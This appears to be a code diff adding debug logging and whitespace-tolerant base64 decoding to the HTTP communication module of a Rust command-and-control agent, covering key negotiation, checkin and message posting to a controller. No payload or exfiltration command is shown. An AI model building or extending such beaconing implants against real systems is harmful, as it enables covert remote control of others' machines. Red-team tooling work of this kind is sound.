@@ -187,10 +187,11 @@ impl HttpProfile {
     /// Format: base64( UUID_bytes + [AES_encrypt(data) | data] )
     fn decode_response(&self, response_text: &str) -> Option<Vec<u8>> {
         // Base64 decode the entire response first
-        let raw = match BASE64.decode(response_text.trim()) {
+        let cleaned: String = response_text.chars().filter(|c| !c.is_whitespace()).collect();
+        let raw = match BASE64.decode(&cleaned) {
             Ok(d) => d,
             Err(e) => {
-                utils::print_debug(&format!("Base64 decode error: {}", e));
+                eprintln!("[agent] decode_response: base64 decode error: {} (first 100 chars: {:?})", e, &cleaned[..std::cmp::min(cleaned.len(), 100)]);
                 return None;
             }
         };
@@ -232,6 +233,7 @@ impl HttpProfile {
         let url = self.get_post_url();
         let headers = self.build_headers();
         let encoded = self.encode_message(data);
+        eprintln!("[agent] send_message: POST {} ({}B encoded)", url, encoded.len());
 
         for attempt in 0..MAX_RETRY_COUNT {
             match client
@@ -242,19 +244,23 @@ impl HttpProfile {
                 .await
             {
                 Ok(resp) => {
+                    let status = resp.status();
+                    eprintln!("[agent] send_message: HTTP {}", status);
                     match resp.text().await {
                     Ok(text) => {
+                        eprintln!("[agent] send_message: response body ({}B): {:?}", text.len(), &text[..std::cmp::min(text.len(), 200)]);
                         if let Some(decoded) = self.decode_response(&text) {
                             return Some(decoded);
                         }
+                        eprintln!("[agent] send_message: decode_response returned None");
                         return None;
                     }
                     Err(e) => {
-                        utils::print_debug(&format!("Response read error (attempt {}): {}", attempt, e));
+                        eprintln!("[agent] send_message: response read error (attempt {}): {}", attempt, e);
                     }
                 }},
                 Err(e) => {
-                    utils::print_debug(&format!("HTTP send error (attempt {}): {}", attempt, e));
+                    eprintln!("[agent] send_message: HTTP send error (attempt {}): {}", attempt, e);
                     profiles::increment_failed_connection("http");
                 }
             }
@@ -359,27 +365,37 @@ impl Profile for HttpProfile {
     }
 
     async fn start(&self) {
+        eprintln!("[agent] HTTP start() entered");
         self.running.store(true, Ordering::Relaxed);
         self.should_stop.store(false, Ordering::Relaxed);
 
         // Negotiate key if needed
+        eprintln!("[agent] HTTP: calling negotiate_key()");
         if !self.negotiate_key().await {
+            eprintln!("[agent] HTTP: negotiate_key() FAILED, returning");
             self.running.store(false, Ordering::Relaxed);
             return;
         }
+        eprintln!("[agent] HTTP: negotiate_key() OK");
 
         // Checkin
+        eprintln!("[agent] HTTP: calling checkin()");
         let checkin_response = match self.checkin().await {
-            Some(r) => r,
+            Some(r) => {
+                eprintln!("[agent] HTTP: checkin() returned response");
+                r
+            }
             None => {
+                eprintln!("[agent] HTTP: checkin() returned None, returning");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
         };
 
         if let Some(status) = &checkin_response.status {
+            eprintln!("[agent] HTTP: checkin status = {:?}", status);
             if status != "success" {
-                log::error!("HTTP: Checkin status: {}", status);
+                eprintln!("[agent] HTTP: checkin status not success, returning");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
